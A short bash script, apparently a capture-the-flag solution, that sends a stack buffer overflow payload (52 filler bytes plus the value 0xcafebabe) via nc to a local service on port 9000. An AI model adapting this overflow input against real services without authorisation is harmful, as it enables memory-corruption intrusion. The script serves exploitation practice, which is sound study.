#!/usr/bin/env bash

(printf "a%.0s" {1..52} && printf "\xbe\xba\xfe\xca"; cat) | nc 0 9000
